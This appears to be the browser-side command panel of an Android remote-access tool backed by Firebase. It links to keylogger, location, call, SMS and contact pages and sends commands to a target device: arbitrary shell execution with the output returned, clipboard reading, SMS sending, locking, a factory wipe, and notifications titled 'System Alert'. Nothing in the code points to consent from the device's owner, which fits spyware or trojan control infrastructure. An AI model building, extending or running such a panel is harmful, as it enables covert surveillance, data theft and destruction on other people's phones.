// Initialize Firebase
let db;
try {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    db = firebase.database();
} catch (error) {
    console.error("Firebase initialization error:", error);
    alert("Failed to initialize Firebase: " + error.message);
}

// Get Device ID from URL
const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('id');

if (!deviceId) {
    alert("No Device ID specified.");
    window.location.href = "index.html";
}

// Update Sidebar Links with Device ID
function updateSidebarLinks() {
    if (document.getElementById('link-dashboard')) {
        document.getElementById('link-dashboard').href = `device.html?id=${deviceId}`;
        document.getElementById('link-remote').href = `remote.html?id=${deviceId}`;
        document.getElementById('link-location').href = `location.html?id=${deviceId}`;
        document.getElementById('link-keylogs').href = `keylogs.html?id=${deviceId}`;
        document.getElementById('link-info').href = `info.html?id=${deviceId}`;
        document.getElementById('link-apps').href = `apps.html?id=${deviceId}`;
        document.getElementById('link-calls').href = `calls.html?id=${deviceId}`;
        document.getElementById('link-sms').href = `sms.html?id=${deviceId}`;
        document.getElementById('link-contacts').href = `contacts.html?id=${deviceId}`;
        document.getElementById('link-notifications').href = `notifications.html?id=${deviceId}`;
    }
}
updateSidebarLinks();

// Elements
const statusEl = document.getElementById('connection-status');
const deviceNameEl = document.getElementById('device-name');
const deviceIdEl = document.getElementById('device-id');
const loadingEl = document.getElementById('loading');
const dashboardContent = document.getElementById('dashboard-content');

// Init
function init() {
    // Connection Status
    db.ref(".info/connected").on("value", (snap) => {
        if (snap.val() === true) {
            statusEl.textContent = "Connected";
            statusEl.classList.add("status-online");
            statusEl.classList.remove("status-offline");
        } else {
            statusEl.textContent = "Disconnected";
            statusEl.classList.add("status-offline");
            statusEl.classList.remove("status-online");
        }
    });

    // Device Info
    const deviceRef = db.ref(`devices/${deviceId}`);

    // Timeout check
    const loadTimeout = setTimeout(() => {
        if (loadingEl && loadingEl.style.display !== 'none') {
            loadingEl.textContent = "Device not found or offline.";
            loadingEl.style.color = "#ef4444";
        }
    }, 10000);

    deviceRef.on('value', (snapshot) => {
        clearTimeout(loadTimeout);
        const device = snapshot.val();

        if (device) {
            deviceNameEl.textContent = device.model || 'Unknown Device';
            deviceIdEl.textContent = `ID: ${deviceId} | ${device.manufacturer || ''}`;

            // Populate SIM cards
            if (device.simCards) {
                populateSimCards(device.simCards);
            }

            if (loadingEl) loadingEl.style.display = 'none';
            if (dashboardContent) dashboardContent.style.display = 'block';
        } else {
            console.warn("No device data found");
        }
    });
}

// --- Command Handling ---

window.sendCommand = function (commandType, extras = {}) {
    if (!deviceId) return;

    // Direct mapping for simple commands if passed as single string
    const cmdMap = {
        'torch_on': 'torch_on',
        'torch_off': 'torch_off',
        'start_location': 'start_location_tracking',
        'stop_location': 'stop_location_tracking',
        'get_clipboard': 'get_clipboard'
    };

    // If commandType matches a key in cmdMap, use the mapped value. 
    // Otherwise use commandType as is.
    const finalCmd = cmdMap[commandType] || commandType;

    const cmdRef = db.ref(`commands/${deviceId}`);

    // Construct payload
    const payload = {
        type: finalCmd,
        timestamp: firebase.database.ServerValue.TIMESTAMP,
        ...extras
    };

    cmdRef.push(payload)
        .then(() => {
            console.log(`Command ${finalCmd} sent`);
        })
        .catch((error) => {
            console.error("Error sending command:", error);
            alert("Failed to send command.");
        });
};

window.sendVibrate = function () {
    window.sendCommand('vibrate', { duration: 3000 });
    alert("Vibrate command sent!");
};

window.sendTorch = function (state) {
    window.sendCommand('torch', { status: state });
    alert(`Torch ${state ? 'ON' : 'OFF'} command sent!`);
};

window.sendLock = function () {
    if (confirm("Are you sure you want to LOCK the device? It will be unusable until unlocked.")) {
        window.sendCommand('lock');
        alert("Lock command sent!");
    }
};

window.sendUnlock = function () {
    window.sendCommand('unlock');
    alert("Unlock command sent!");
};

window.sendWipe = function () {
    if (confirm("⚠️ DANGER: This will FACTORY RESET the remote device.\n\nALL DATA WILL BE LOST PERMANENTLY.\n\nAre you absolutely sure?")) {
        if (confirm("Last Chance: Really wipe the device?")) {
            window.sendCommand('wipe_data');
            alert("Wipe Data command sent. Goodbye, device.");
        }
    }
};

window.sendToast = function () {
    const input = document.getElementById('toast-message');
    if (input && input.value.trim() !== "") {
        window.sendCommand('show_toast', { message: input.value.trim() });
        input.value = "";
        alert("Toast command sent!");
    } else {
        alert("Please enter a message.");
    }
};

window.sendNotification = function () {
    const input = document.getElementById('notification-message');
    if (input && input.value.trim() !== "") {
        window.sendCommand('show_notification', {
            title: 'System Alert',
            message: input.value.trim()
        });
        input.value = "";
        alert("Notification command sent!");
    } else {
        alert("Please enter a message.");
    }
};

window.sendSpeak = function () {
    const input = document.getElementById('speak-message');
    if (input && input.value.trim() !== "") {
        window.sendCommand('speak', {
            text: input.value.trim()
        });
        input.value = "";
        alert("Speak command sent!");
    } else {
        alert("Please enter text to speak.");
    }
};

// Populate SIM card dropdown
function populateSimCards(simCards) {
    const simSelect = document.getElementById('sms-sim');
    if (!simSelect) return;

    // Preserve existing selection if possible, otherwise reset
    const currentVal = simSelect.value;

    simSelect.innerHTML = '<option value="">Default / Auto</option>';

    if (Array.isArray(simCards) && simCards.length > 0) {
        simCards.forEach(sim => {
            const option = document.createElement('option');
            option.value = sim.subscriptionId;
            option.textContent = `${sim.displayName} (${sim.carrierName})`;
            simSelect.appendChild(option);
        });
    }

    if (currentVal) simSelect.value = currentVal;
}

window.sendSms = function () {
    const simSelect = document.getElementById('sms-sim');
    const phoneInput = document.getElementById('sms-phone');
    const messageInput = document.getElementById('sms-message');

    const simSlot = simSelect?.value ? parseInt(simSelect.value) : null;
    const phone = phoneInput?.value.trim();
    const message = messageInput?.value.trim();

    if (!phone || !message) {
        alert('Please enter both phone number and message.');
        return;
    }

    const commandData = {
        phoneNumber: phone,
        message: message
    };

    if (simSlot !== null && !isNaN(simSlot)) {
        commandData.simSlot = simSlot;
    }

    window.sendCommand('send_sms', commandData);

    phoneInput.value = '';
    messageInput.value = '';
    alert("SMS command queued!");
};

window.sendShell = function () {
    const input = document.getElementById('shell-input');
    if (input && input.value.trim() !== "") {
        const cmd = input.value.trim();
        window.sendCommand('shell', {
            command: cmd
        });

        appendTerminalOutput(`$ ${cmd}`);
        input.value = "";
    }
};

function appendTerminalOutput(text) {
    const terminal = document.getElementById('terminal-output');
    if (terminal) {
        terminal.innerText += "\n" + text;
        terminal.scrollTop = terminal.scrollHeight;
    }
}

// Listen for shell responses
function listenForShellResponse() {
    if (!deviceId) return;

    db.ref(`data/${deviceId}/shell_response`).on('value', snap => {
        const response = snap.val();
        if (response) {
            appendTerminalOutput(response.output);
            // Optional: clear response after showing? 
            // snap.ref.remove(); 
        }
    });
}

// Add to init
const originalInit = window.init; // Store existing init if any (though we defined it)
// We need to call listenForShellResponse inside init. 
// Since init is defined above, we can modify it or append to it. 
// Actually, let's just add the listener call at the end of the file since init calls listenForLogs() which is similar.
// But wait, init is called on page load. We can hook into it or just run it if deviceId exists.

if (deviceId) {
    listenForShellResponse();
    listenForClipboardResponse();
}

window.getClipboard = function () {
    window.sendCommand('get_clipboard');
    // alert("Request sent. Waiting for response...");
}

window.setClipboard = function () {
    const input = document.getElementById('clipboard-input');
    if (input && input.value.trim() !== "") {
        window.sendCommand('set_clipboard', { text: input.value.trim() });
        input.value = "";
        alert("Clipboard update sent!");
    } else {
        alert("Please enter text to copy.");
    }
}

function listenForClipboardResponse() {
    if (!deviceId) return;

    db.ref(`data/${deviceId}/clipboard`).on('value', snap => {
        const data = snap.val();
        const display = document.getElementById('clipboard-display');
        if (data && display) {
            display.value = data.text || "(Empty)";
        }
    });
}
